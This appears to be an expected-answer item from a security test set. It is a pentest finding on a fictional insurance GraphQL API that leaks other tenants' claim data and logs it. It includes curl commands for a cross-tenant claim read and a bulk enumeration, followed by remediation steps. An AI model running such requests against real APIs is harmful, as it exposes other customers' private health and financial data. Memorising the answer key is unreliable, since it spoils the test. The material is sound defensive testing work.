# Expected Response

## System
- Domain: Insurance / Claims Processing
- System: ClaimsFlow Underwriting API
- Example ID: GQL-0062

## Priority Findings

### Finding 1: Cross-Tenant Insurance Claim Access — Operational PII/PHI Leaked to Application Logs (Pattern 7.1)
**Severity:** Critical
**Category:** BOLA / Logging Failures

**Summary:**
The `getClaim` query on `POST /graphql` returns insurance claim record `C-2062` (belonging to `tenant-247e`) to an attacker from `tenant-18f6`. Per §5.0 (Pattern 7.1 — operational PII/PHI leakage), the successful cross-tenant query also populates application logs with the sensitive claim data (`sensitiveField`, `internalNotes`), which may be retained in log aggregation systems beyond the intended security boundary. Insurance claim data includes personal health/financial information protected under GDPR/HIPAA/state insurance regulations.

**Evidence from HAR:**
- Request: `POST https://api.claimsflow-underwrit.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-18f6`
- Query: `getClaim(id: "C-2062") { claimId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-247e"`, `ownerId: "other-user-18f6247e"`, `sensitiveField: "CONFIDENTIAL-18f6247e"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-18f6247e`

**Root Cause (§4.0 RISK-GQL-062):** `getClaim` resolver fetches by `claimId` only; cross-tenant claim data is returned and logged.

## Steps to Reproduce

### Step 1 — Cross-tenant claim read (HAR)
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-18f6" \
  -d '{"query": "query VulnerableOp { getClaim(id: \"C-2062\") { claimId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `CONFIDENTIAL-18f6247e` from `tenant-247e`; response also logged with `x-request-id: req-18f6247e`. **Secure:** FORBIDDEN.

### Step 2 — Bulk cross-tenant claim enumeration
```bash
curl -s -X POST https://api.claimsflow-underwrit.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-18f6" \
  -d '{"query": "mutation { bulkClaimLookup(ids: [\"C-2062\", \"C-247e-002\"]) { claimId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns insurance claim records from `tenant-247e`.

## Remediation
1. Resolver tenant guard on `getClaim`: `WHERE claim_id=$id AND tenant_id=$jwt.tenantId`.
2. Never log raw `sensitiveField`/`internalNotes` — log only `claimId` and `tenantId` for audit.
3. Per-ID ownership filter in bulk claim lookups.
4. Redis cache key includes `tenantId`.
